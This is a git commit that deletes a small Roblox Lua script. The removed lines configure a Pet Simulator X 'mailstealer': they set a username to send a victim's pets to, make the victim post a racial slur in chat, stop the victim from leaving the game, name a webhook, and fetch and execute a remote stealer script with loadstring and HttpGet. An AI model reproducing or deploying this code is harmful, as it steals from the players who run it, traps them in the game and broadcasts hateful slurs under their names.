214ff88ff823d17cb8fb2c577fcc9b8fb43eb2ee
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-06-23 20:38:06 +0500

    Delete GaiPoloMDRs_4016.lua

--- GaiPoloMDRs_4016.lua
+++
@@ -1,9 +0,0 @@
-
-_G.Username = "buckleshoe" --// Username To Send Pets To
-_G.GiftMessage = "NIGGA" --// Message For The Gift To Say
-_G.SendMessage = "NIGGA" --// Message the victim will send in the chat on execution
-_G.Diamonds = 1 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
-_G.UnlockPets = true --// Unlocks Locked Pets
-_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-_G.Webhook = "https://pornhub.com" --// Discord Webhook URL
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GadoScripts/PetSimulatorX/main/mailstealer.lua"))()
